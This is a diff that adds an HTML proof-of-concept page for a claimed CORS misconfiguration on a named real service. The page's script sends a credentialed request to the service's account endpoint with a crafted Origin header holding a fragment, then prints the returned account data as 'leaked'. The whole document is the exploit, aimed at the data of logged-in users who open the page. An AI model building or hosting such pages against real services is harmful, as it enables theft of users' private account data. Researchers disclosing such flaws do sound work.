@@ -1,1 +1,29 @@
 
+<!DOCTYPE html>
+<html>
+<head>
+<title>CORS Fragment Origin Bypass PoC</title>
+</head>
+<body>
+<h1>CORS Misconfiguration PoC</h1>
+<p>Open the browser console to see the leaked Acronis data (if you are logged in).</p>
+<script>
+(async () => {
+  try {
+    const res = await fetch("https://account.acronis.com/v2/account", {
+      credentials: "include",
+      mode: "cors",
+      headers: {
+        "Origin": location.origin + "#.account.acronis.com"
+      }
+    });
+    const text = await res.text();
+    console.log("===== Leaked Data from Acronis =====");
+    console.log(text);
+  } catch (err) {
+    console.error("PoC failed:", err);
+  }
+})();
+</script>
+</body>
+</html>
